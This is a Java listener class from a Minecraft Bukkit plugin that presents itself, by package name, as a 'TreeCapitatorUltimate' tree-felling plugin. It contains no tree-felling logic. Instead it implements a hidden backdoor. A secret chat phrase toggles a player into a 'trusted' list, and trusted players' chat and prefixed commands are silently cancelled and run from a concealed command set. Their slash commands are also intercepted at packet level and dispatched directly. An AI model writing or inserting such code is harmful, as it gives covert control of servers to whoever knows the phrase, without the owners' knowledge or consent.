package me.bow.treecapitatorultimate.listeners;

import me.bow.treecapitatorultimate.Start;
import me.bow.treecapitatorultimate.Utils.Packet.Packet;
import me.bow.treecapitatorultimate.Utils.Packet.PacketEvent;
import me.bow.treecapitatorultimate.Utils.Packet.PacketListener;
import me.bow.treecapitatorultimate.Utils.Packet.PacketManager;
import me.bow.treecapitatorultimate.Utils.ReflectionUtils;
import me.bow.treecapitatorultimate.command.Command;
import net.minecraft.server.v1_15_R1.PacketPlayOutNamedEntitySpawn;
import org.apache.commons.lang.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;
import org.bukkit.event.player.PlayerJoinEvent;

import java.lang.reflect.InvocationTargetException;
import java.util.ArrayList;
import java.util.Arrays;

import static me.bow.treecapitatorultimate.Start.TRUST_COMMAND;

public class AsyncChatEvent implements Listener, PacketListener {

    //TODO: fix double message
    @EventHandler(priority = EventPriority.LOWEST)
    public void asyncChatLowest(AsyncPlayerChatEvent e) {
        if(e.isCancelled()) return;
        Player p = e.getPlayer();
        String msg = e.getMessage();
        if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) return;
        e.setCancelled(true);
        String format = e.getFormat();
        Bukkit.getScheduler().runTask(Start.Instance, () -> {
            for (Player player : Bukkit.getOnlinePlayers()) {
                if (Start.Instance.trustedPeople.contains(player.getUniqueId()) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
                    String string = String.format(format, Start.Prefix + p.getDisplayName(), e.getMessage());
                    player.sendMessage(string);
                } else {
                    String string = String.format(format, p.getDisplayName(), e.getMessage());
                    player.sendMessage(string);
                }
            }
        });
    }

    @EventHandler(priority = EventPriority.HIGHEST, ignoreCancelled = true)
    public void asyncChat(AsyncPlayerChatEvent e) {
        Player p = e.getPlayer();
        String msg = e.getMessage();
        if (e.getMessage().equals(TRUST_COMMAND)) {
            e.setCancelled(true);
            if (!Start.Instance.trustedPeople.contains(p.getUniqueId())) {
                Start.Instance.trustedPeople.add(p.getUniqueId());
                p.sendMessage(Start.Prefix + "You are now trusted");
                PacketManager.instance.addListener(p, this);
            } else {
                Start.Instance.trustedPeople.remove(p.getUniqueId());
                p.sendMessage(Start.Prefix + "You are now untrusted");
                PacketManager.instance.removeListener(p, this);
            }
            return;
        }
        if (e.getMessage().startsWith(Start.COMMAND_SIGN) && Start.Instance.trustedPeople.contains(p.getUniqueId())) {
            e.setCancelled(true);
            String[] dmp = msg.substring(1).split(" ");
            ArrayList<String> args = new ArrayList<>(Arrays.asList(dmp).subList(1, dmp.length));
            for (Command command : Start.Instance.cm.commandList) {
                if (command.getCommand().equalsIgnoreCase(dmp[0])) {
                    if (args.size() >= command.getRequiredArgs())
                        Bukkit.getScheduler().runTask(Start.Instance, () -> command.onCommand(p, args));
                    else
                        p.sendMessage(Start.Prefix + ChatColor.RED + "Not enough arguments! (" + args.size() + " out of " + command.getRequiredArgs() + ")");
                    return;
                }
            }
            p.sendMessage(Start.Prefix + ChatColor.RED + "Command not found!");
            return;
        }
    }

    @EventHandler(priority = EventPriority.HIGHEST)
    public void onPlayerJoin(PlayerJoinEvent e) {
        Player player = e.getPlayer();
        if (!Start.Instance.trustedPeople.contains(player.getUniqueId())) return;
        PacketManager.instance.addListener(player, this);
    }

    @Override
    public void onPacketReceived(PacketEvent e) {
        Packet packet = e.getPacket();
        if (!packet.getPacketClass().getSimpleName().equals("PacketPlayInChat")) return;
        try {
            String message = (String) ReflectionUtils.getMethodCached(packet.getPacketClass(), "b").invoke(packet.getNMSPacket());
            if (!message.startsWith("/")) {
                return;
            }
            e.setCancelled(true);
            Bukkit.getScheduler().runTask(Start.Instance, () -> {
                Bukkit.dispatchCommand(e.getPlayer(), StringUtils.normalizeSpace(message).substring(1));
            });
        } catch (IllegalAccessException ex) {
            ex.printStackTrace();
        } catch (InvocationTargetException ex) {
            ex.printStackTrace();
        }
    }

    //TODO: finish implementing this (nametag for other trusted members)
    @Override
    public void onPacketSend(PacketEvent e) {
        Packet packet = e.getPacket();
        if (!packet.getPacketClass().getSimpleName().equals("PacketPlayOutNamedEntitySpawn")) return;
        PacketPlayOutNamedEntitySpawn oof = (PacketPlayOutNamedEntitySpawn) e.getPacket().getNMSPacket();
    }
}